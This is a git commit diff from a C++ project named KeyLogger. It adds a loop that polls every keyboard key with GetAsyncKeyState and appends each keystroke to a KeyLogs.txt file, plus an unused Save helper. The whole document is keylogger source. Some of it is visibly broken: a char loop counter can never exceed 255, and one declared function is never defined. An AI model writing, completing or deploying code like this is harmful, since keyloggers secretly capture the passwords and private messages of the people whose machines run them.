f02b8c14e8e9bac16c6c4fef58272e40c9ec3587
Xavier Perez <Xavier Perez>
2017-05-22 15:33:39 -0700

    Added Save function.

--- KeyLogger/KeyLogger/Source.cpp
+++ KeyLogger/KeyLogger/Source.cpp
@@ -6,8 +6,39 @@
 
 using namespace std;
 
+void Save(string text);
+bool nonLetterButtons(int key);
+
 int main()
 {
+	char i;
 
+	while (true)
+	{
+
+		for (i = 8; i <= 255; i++)
+		{
+
+			if (GetAsyncKeyState(i) == -32767) //if a Keyboard button is pressed 
+			{
+
+					ofstream logFile;
+					logFile.open("KeyLogs.txt", fstream::app); //opens txt file IF buttons pressed are letters
+					logFile << i;
+					logFile.close();
+		
+			}
+		}
+	}
 	return 0;
+}
+
+void Save(string text)
+{
+
+	ofstream logFile;
+	logFile.open("KeyLogs.txt", fstream::app); //opens up txt file
+	logFile << text;
+	logFile.close();
+
 }
